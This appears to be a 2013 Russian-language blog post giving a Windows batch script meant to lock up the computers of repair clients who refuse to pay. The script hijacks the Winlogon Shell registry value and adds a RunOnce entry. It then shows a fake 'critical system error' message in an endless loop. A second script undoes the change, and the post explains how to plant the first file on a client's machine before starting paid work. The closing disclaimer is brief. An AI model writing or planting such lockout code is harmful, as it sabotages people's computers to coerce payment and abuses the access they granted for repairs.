+++
title = "Бомба для недобросовестного клиента"
date = 2013-08-23T21:01:00Z
updated = 2013-08-23T21:01:54Z
blogimport = true 
[author]
	name = "devi1"
	uri = "https://www.blogger.com/profile/05777499482649623616"
+++

<span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">Обратился ко мне один знакомый аникейщик. Он хотел, чтобы я написал скрипт, который будет как либо портить жизнь его клиентов, которые его кидают. Например, они согласились на ремонт и его оплату, т.е. согласились с суммой. Когда работа уже сделана, клиент выгоняет тебя, ничего не заплатив. Как с этим бороться? Я написал простой батничек. Вот его исходники:</span><br /><br /><a name='more'></a><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">@echo off</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d %systemroot%\restore.bat /f &gt;nul</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\W</span><wbr style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;"></wbr><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">indows\CurrentVersion\RunOnce" /d %systemroot$\restore.bat /f &gt;nul</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">Echo Attention! Crytical system error! Kernel rebilding. Don`t touching a keyboard!</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">:sysinf &gt;nul</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">systeminfo &gt;nul</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">goto sysinf &gt;nul</span><br /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">Теперь разберемся. Первые две строчки прописывают файл в реестр. Сначала для запуска вместо explorer.exe, а затем для единоразового автоматического запуска при старте системы (для любого пользователя). В конце всех строк, кроме первой и четвертой имеется параметр "&gt;nul". Этот параметр отвечает за отсутствие вывода результатов работы команд.</span><br /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">Пятая строчка является меткой, по вызову которой следует незамедлительно мыполнить нижеследующие команды.</span><br /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">Шестой строчкой я делаю запрос о состоянии системы. Т.е. какое железо и обновления установлены на компе. Команду можно смело сменить на другую. Было необходимо, чтобы были сменяющиеся надписи.</span><br /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">Седьмая строка возвращает выполнение на метку (пятая строка) после выполнения шестой строки, что приводит машину к замкнутому циклу. По сути, появляется тот же самый порно баннер, только его можно закрыть. С другой стороны, после перезапуска он появится вновь.</span><br /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">А вот второй код, убирающий действие первого.</span><br /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">@echo off</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d explorer.exe /f &gt;nul</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\W</span><wbr style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;"></wbr><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">indows\CurrentVersion\RunOnce" /d &nbsp; /f &gt;nul</span><br /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">Схема работы.</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">1. Копируете первый батник (restore.bat) в папку виндоус на системе клиента. Внимание! Сделать это надо ДО начала платных работ.</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">2. Запускаем его и как только появляется надпись, закрываем (значит, что ключи прописаны).</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">3. Если вас выгоняют - просто уходим. Все работает до первой перезагрузки. Если все нормально - запускаем второй батник (называйте, как хотите). Он вернет систему в первоначальное состояние.</span><br /><br style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;" /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;">Конечно, использовать его не надо. На самом деле, он необходим, чтобы вы знали, куда копать, если появится подобное. А также, чтобы понимали, что могут сделать люди, которых кинули. Поговорка "Скупой платит дважды" как раз про эту ситуацию.</span><br /><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;"><br /></span><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;"><br /></span><span style="background-color: white; color: #333333; font-family: Arial, sans-serif; font-size: 13px; line-height: 16px;"><a href="http://dojuk.livejournal.com/3726.html">Отсюда</a></span>
